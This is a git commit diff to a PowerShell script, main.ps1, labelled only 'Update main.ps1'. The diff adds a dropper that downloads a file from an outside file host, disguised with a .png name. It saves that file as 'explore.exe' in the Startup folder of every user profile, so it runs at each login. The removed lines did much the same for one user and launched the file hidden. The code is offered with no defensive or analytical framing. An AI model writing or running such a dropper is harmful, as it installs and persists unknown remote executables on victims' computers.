64af2639edcd14b5faa51fb69ae40966bea1123f
Sombrant <128651023+sombrant@users.noreply.github.com>
2024-12-05 18:09:54 +0100

    Update main.ps1

--- main.ps1
+++ main.ps1
@@ -1,6 +1,14 @@
-$DownloadURL = "url"
-$DestinationPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\explore.exe"
+$DownloadURL = "https://files.catbox.moe/6gruhh.png"
 
-Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing -OutFile $DestinationPath
+$UsersFolder = "C:\Users"
 
-Start-Process -FilePath $DestinationPath -WindowStyle Hidden
+Get-ChildItem -Directory $UsersFolder | ForEach-Object {
+    $UserProfile = $_.FullName
+    $StartupPath = Join-Path -Path $UserProfile -ChildPath "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\explore.exe"
+
+    if (Test-Path -Path (Split-Path -Parent $StartupPath)) {
+        Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing -OutFile $StartupPath
+    }
+}
+
+
